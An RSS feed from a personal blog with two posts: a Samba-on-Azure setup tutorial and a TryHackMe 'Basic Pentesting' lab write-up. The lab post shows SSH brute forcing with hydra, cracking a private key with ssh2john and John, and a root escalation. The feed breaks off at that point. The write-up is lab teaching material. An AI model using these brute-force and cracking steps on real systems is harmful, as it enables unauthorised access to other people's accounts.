<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Samba on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/samba/</link>
    <description>Recent content in Samba on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 04 Jul 2021 19:45:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/samba/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Setup a Samba Server in Azure and Make It Accessible Over Internet</title>
      <link>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</link>
      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</guid>
      <description>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.
In this post, I’ll share my documentation on how to setup a Samba server in Azure.
Before proceeding further, I&amp;rsquo;ll state that:
 Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &amp;lsquo;best practice&amp;rsquo;.</description>
      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.</p>
<p>In this post, I’ll share my documentation on how to setup a Samba server in Azure.</p>
<p>Before proceeding further, I&rsquo;ll state that:</p>
<blockquote>
<p>Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &lsquo;best practice&rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.</p>
</blockquote>
<h2 id="goals-and-outcomes">Goals and Outcomes</h2>
<p>The goal here is exactly the same as what’s written in the title, but by the end of this post, you will be able to:</p>
<ul>
<li>Deploy an Ubuntu server in Azure</li>
<li>Setup and Configure a Samba server</li>
<li>Exposing Samba server over Internet</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>The one and only prerequisite is:</p>
<ul>
<li>Azure Account</li>
</ul>
<p>Also, since this post won&rsquo;t be detailed step by step, I&rsquo;ll assume that you have:</p>
<ul>
<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
<li>Basic knowledge of Linux</li>
</ul>
<p>Let&rsquo;s jump in!</p>
<h2 id="vm-configuration--deploy">VM Configuration &amp; Deploy</h2>
<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
<p>The VM details of mine can be seen in the following image:</p>
<p><img class="img-container" src="imgs/image-20210513170545346.png" alt="image-20210513170545346"  />
</p>
<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
<p><img class="img-container" src="imgs/image-20210513170638603.png" alt="image-20210513170638603"  />
</p>
<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
<p><img class="img-container" src="imgs/image-20210513170710958.png" alt="image-20210513170710958"  />
</p>
<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
<p><img class="img-container" src="imgs/image-20210513170824172.png" alt="image-20210513170824172"  />
</p>
<p>In the <strong>Management</strong> section, because it will be temporary, I&rsquo;ll just disable the boot diagnostics.</p>
<p><img class="img-container" src="imgs/image-20210513171009570.png" alt="image-20210513171009570"  />
</p>
<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
<p>The last section is <strong>Review + Create</strong>, which basically reviews the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
<p><img class="img-container" src="imgs/image-20210513171153896.png" alt="image-20210513171153896"  />
</p>
<p>When the <strong>Create</strong> button is clicked, the VM will be automatically deployed.</p>
<p><img class="img-container" src="imgs/image-20210513171501031.png" alt="image-20210513171501031"  />
</p>
<h2 id="vm-login-via-ssh">VM Login via SSH</h2>
<p>The next step is to login to the deployed VM instance with the previously defined username via SSH. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS
</code></pre></div><p><img class="img-container" src="imgs/image-20210513171606268.png" alt="image-20210513171606268"  />
</p>
<h2 id="smb-configuration">SMB Configuration</h2>
<h3 id="installation-and-initial-setup">Installation and Initial Setup</h3>
<p>First thing first, let&rsquo;s update the repository list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt update
</code></pre></div><p>After that, install <code>Samba</code> with the following command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt install samba
</code></pre></div><p>Once the installation is done, check the Samba service daemon status.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo systemctl status smbd
● smbd.service - Samba SMB Daemon
   Loaded: loaded <span style="color:#f92672">(</span>/lib/systemd/system/smbd.service; enabled; vendor preset: enabled<span style="color:#f92672">)</span>
   Active: active <span style="color:#f92672">(</span>running<span style="color:#f92672">)</span> since Thu 2021-05-13 10:17:45 UTC; 3min 48s ago
     Docs: man:smbd<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
           man:samba<span style="color:#f92672">(</span>7<span style="color:#f92672">)</span>
           man:smb.conf<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
 Main PID: <span style="color:#ae81ff">2098</span> <span style="color:#f92672">(</span>smbd<span style="color:#f92672">)</span>
   Status: <span style="color:#e6db74">&#34;smbd: ready to serve connections...&#34;</span>
    Tasks: <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>limit: 1056<span style="color:#f92672">)</span>
   CGroup: /system.slice/smbd.service
           ├─2098 /usr/sbin/smbd --foreground --no-process-group
           ├─2123 /usr/sbin/smbd --foreground --no-process-group
           ├─2124 /usr/sbin/smbd --foreground --no-process-group
           └─2129 /usr/sbin/smbd --foreground --no-process-group

May <span style="color:#ae81ff">13</span> 10:17:44 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Starting Samba SMB Daemon...
May <span style="color:#ae81ff">13</span> 10:17:45 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Started Samba SMB Daemon.
</code></pre></div><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
<h3 id="shares-configuration">Shares Configuration</h3>
<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span style="color:#f92672">{</span>,.backup<span style="color:#f92672">}</span>
</code></pre></div><p>Now create a share folder name it <code>sambashare</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ mkdir sambashare
</code></pre></div><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf
</code></pre></div><p>Go straight to the bottom of the file and add the following lines.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>sambashare<span style="color:#f92672">]</span>
    comment <span style="color:#f92672">=</span> Samba Share
    path <span style="color:#f92672">=</span> /home/azure-smb/sambashare
    read only <span style="color:#f92672">=</span> no
    browsable <span style="color:#f92672">=</span> yes
</code></pre></div><p>Details for configuring share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html">here</a>.</p>
<p>Save the file and restart the SMB daemon with the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo service smbd restart
</code></pre></div><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo ufw allow samba
</code></pre></div><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
<ul>
<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
<li><a href="https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user">https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
</ul>
<h3 id="add-samba-user">Add Samba User</h3>
<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we can&rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to <code>azure-smb</code>.</p>
<p>But now, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1
</code></pre></div><p>Assign <code>user1</code> to be the owner of the share</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare
</code></pre></div><p>After that, create a Samba password for <code>user1</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -a user1
New SMB password: 
Retype new SMB password: 
Added user user1.
</code></pre></div><p>Finally, enable the user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -e user1
Enabled user user1.
</code></pre></div><h2 id="expose-to-internet">Expose to Internet</h2>
<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
<p>Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PUBLIC_IP:445 --&gt; PRIVATE_IP:445
</code></pre></div><p>To do that open up the Networking settings of the SMB VM and click on **Add inbound port rule **button.</p>
<p><img class="img-container" src="imgs/image-20210513173838694.png" alt="image-20210513173838694"  />
</p>
<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
<p><img class="img-container" src="imgs/image-20210513173858659.png" alt="image-20210513173858659"  />
</p>
<p>At the bottom, the configuration is as follows:</p>
<p><img class="img-container" src="imgs/image-20210513173929271.png" alt="image-20210513173929271"  />
</p>
<p>When you&rsquo;re done, click on the <strong>Add</strong> button and it will be listed in the <strong>Inbound port rules</strong> section.</p>
<p><img class="img-container" src="imgs/image-20210513174018895.png" alt="image-20210513174018895"  />
</p>
<h3 id="test-access">Test Access</h3>
<p>We can use <code>Nmap</code> to check the SMB port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nmap -p445 -sV VM_PUBLIC_IP
</code></pre></div><p><img class="img-container" src="imgs/image-20210513174227862.png" alt="image-20210513174227862"  />
</p>
<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo apt install smbclient
</code></pre></div><p>Once it installed, connect to the share with following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> 
</code></pre></div><p>Adding <code>-N -L</code> can list all the available shares.</p>
<p><img class="img-container" src="imgs/image-20210513174416250.png" alt="image-20210513174416250"  />
</p>
<p>You can also provide the password directly in the terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>
$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#e6db74">&#39;username%password&#39;</span>
</code></pre></div><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><img class="img-container" src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  />
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><img class="img-container" src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  />
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><img class="img-container" src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  />
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><img class="img-container" src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  />
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><img class="img-container" src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115»
$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.67.164/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/05/29 13:43:47 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/development          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.67.164/development/<span style="color:#f92672">]</span>
</code></pre></div><h4 id="development">/development</h4>
<p>The web has a directory listing enabled on <code>/development</code>, and there are two text files in that directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><img class="img-container" src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  />
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><img class="img-container" src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  />
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><img class="img-container" src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  />
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><img class="img-container" src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  />
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute force and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the Apache Struts URI.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><img class="img-container" src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  />
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><img class="img-container" src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  />
</p>
<p>I visited <code>/struts2-rest-showcase-2.5.12/</code>, and it&rsquo;s there.</p>
<p><img class="img-container" src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  />
</p>
<p>It tried it with <code>metasploit</code> and it worked!</p>
<p><img class="img-container" src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  />
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.245.112   login: jan   password: armando
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
...&lt;SNIP&gt;...
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-05-29 14:20:56
</code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ ssh jan@10.10.245.112 
jan@10.10.245.112<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 15:55:45 <span style="color:#ae81ff">2018</span> from 192.168.56.102
jan@basic2:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span>
</code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="internal-enumeration">Internal Enumeration</h3>
<p>Enumerating Kay&rsquo;s home directory finds a readable SSH key</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
drwxr-xr-x <span style="color:#ae81ff">5</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> ..
-rw-rw-r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> authorized_keys
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay <span style="color:#ae81ff">3326</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa.pub
</code></pre></div><p>I tried the key to SSH login locally as user Kay but it asked for a password, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----                                                      
Proc-Type: 4,ENCRYPTED                                                               
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
                                                                                     
IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
...&lt;SNIP&gt;...
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
</code></pre></div><h3 id="cracking-id_rsa">Cracking id_rsa</h3>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash; cat kay_rsa.hash
kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</code></pre></div><p><code>JtR</code> finds the password to be <code>beeswax</code>.</p>
<p><img class="img-container" src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  />
</p>
<h3 id="ssh---kay">SSH - Kay</h3>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ chmod <span style="color:#ae81ff">600</span> kay_rsa <span style="color:#f92672">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;kay_rsa&#39;</span>: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 16:04:07 <span style="color:#ae81ff">2018</span> from 192.168.56.102
kay@basic2:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h3 id="su---root">SU - root</h3>
<p>In Kay&rsquo;s home directory,t here is a file called <code>pass.bak</code>. It contains this string:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kay@basic2:~$ sudo su -
root@basic2:~# id
